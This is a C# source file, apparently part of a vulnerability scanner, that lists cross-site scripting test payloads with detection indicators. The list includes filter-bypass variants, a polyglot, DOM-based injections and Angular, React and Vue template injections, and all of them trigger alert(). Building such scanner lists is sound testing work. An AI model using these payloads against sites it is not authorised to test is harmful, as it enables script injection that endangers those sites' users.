namespace VaultScope.Security.Payloads;

public class XssPayload
{
    public string Payload { get; set; } = string.Empty;
    public string Type { get; set; } = "Reflected";
    public List<string> Indicators { get; set; } = new();
    public string Description { get; set; } = string.Empty;
}

public static class XssPayloads
{
    public static List<XssPayload> GetPayloads()
    {
        return new List<XssPayload>
        {
            // Basic XSS
            new XssPayload
            {
                Payload = "<script>alert('XSS')</script>",
                Indicators = new List<string> { "<script>", "</script>", "alert(" },
                Description = "Basic script tag injection"
            },
            new XssPayload
            {
                Payload = "<img src=x onerror=alert('XSS')>",
                Indicators = new List<string> { "<img", "onerror=", "alert(" },
                Description = "Image tag with error handler"
            },
            new XssPayload
            {
                Payload = "<svg onload=alert('XSS')>",
                Indicators = new List<string> { "<svg", "onload=", "alert(" },
                Description = "SVG tag with onload event"
            },
            
            // Event handler injection
            new XssPayload
            {
                Payload = "\" onmouseover=\"alert('XSS')\"",
                Indicators = new List<string> { "onmouseover=", "alert(" },
                Description = "Event handler attribute injection"
            },
            new XssPayload
            {
                Payload = "' onclick='alert(\"XSS\")'",
                Indicators = new List<string> { "onclick=", "alert(" },
                Description = "Click event handler injection"
            },
            
            // JavaScript protocol
            new XssPayload
            {
                Payload = "javascript:alert('XSS')",
                Indicators = new List<string> { "javascript:", "alert(" },
                Description = "JavaScript protocol injection"
            },
            new XssPayload
            {
                Payload = "data:text/html,<script>alert('XSS')</script>",
                Indicators = new List<string> { "data:", "text/html", "<script>" },
                Description = "Data URI injection"
            },
            
            // Filter bypass attempts
            new XssPayload
            {
                Payload = "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                Indicators = new List<string> { "script", "alert(" },
                Description = "Nested tag bypass"
            },
            new XssPayload
            {
                Payload = "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
                Indicators = new List<string> { "<img", "onerror=" },
                Description = "HTML entity encoding bypass"
            },
            new XssPayload
            {
                Payload = "<iframe src=\"javascript:alert('XSS')\">",
                Indicators = new List<string> { "<iframe", "javascript:" },
                Description = "Iframe injection"
            },
            
            // Advanced payloads
            new XssPayload
            {
                Payload = "<input type=\"text\" value=\"\" autofocus onfocus=\"alert('XSS')\">",
                Indicators = new List<string> { "<input", "onfocus=", "alert(" },
                Description = "Autofocus input injection"
            },
            new XssPayload
            {
                Payload = "<video><source onerror=\"alert('XSS')\">",
                Indicators = new List<string> { "<video", "onerror=", "alert(" },
                Description = "Video tag injection"
            },
            new XssPayload
            {
                Payload = "<body onload=alert('XSS')>",
                Indicators = new List<string> { "<body", "onload=", "alert(" },
                Description = "Body tag injection"
            }
        };
    }
    
    public static List<XssPayload> GetAdvancedPayloads()
    {
        return new List<XssPayload>
        {
            // Polyglot payloads
            new XssPayload
            {
                Payload = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                Type = "Polyglot",
                Indicators = new List<string> { "javascript:", "onclick=", "onload=", "alert(" },
                Description = "Universal XSS polyglot"
            },
            
            // DOM-based XSS
            new XssPayload
            {
                Payload = "#<img src=x onerror=alert('DOM-XSS')>",
                Type = "DOM-based",
                Indicators = new List<string> { "<img", "onerror=" },
                Description = "DOM-based XSS via fragment"
            },
            
            // Angular-specific
            new XssPayload
            {
                Payload = "{{constructor.constructor('alert(1)')()}}",
                Type = "Template",
                Indicators = new List<string> { "{{", "}}", "constructor" },
                Description = "Angular template injection"
            },
            
            // React-specific
            new XssPayload
            {
                Payload = "{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}}",
                Type = "Template",
                Indicators = new List<string> { "dangerouslySetInnerHTML", "__html" },
                Description = "React dangerous HTML injection"
            },
            
            // Vue-specific
            new XssPayload
            {
                Payload = "{{_c.constructor('alert(1)')()}}",
                Type = "Template",
                Indicators = new List<string> { "{{", "}}", "_c.constructor" },
                Description = "Vue.js template injection"
            }
        };
    }
    
    public static List<XssPayload> GetContextSpecificPayloads()
    {
        return new List<XssPayload>
        {
            // JSON context
            new XssPayload
            {
                Payload = "\",\"xss\":\"<script>alert('XSS')</script>\",\"",
                Type = "JSON",
                Indicators = new List<string> { "<script>", "alert(" },
                Description = "JSON injection"
            },
            
            // XML context
            new XssPayload
            {
                Payload = "</tag><script>alert('XSS')</script><tag>",
                Type = "XML",
                Indicators = new List<string> { "<script>", "alert(" },
                Description = "XML injection"
            },
            
            // CSS context
            new XssPayload
            {
                Payload = "expression(alert('XSS'))",
                Type = "CSS",
                Indicators = new List<string> { "expression(", "alert(" },
                Description = "CSS expression injection"
            },
            
            // JavaScript string context
            new XssPayload
            {
                Payload = "';alert('XSS');//",
                Type = "JavaScript",
                Indicators = new List<string> { "alert(" },
                Description = "JavaScript string breakout"
            }
        };
    }
}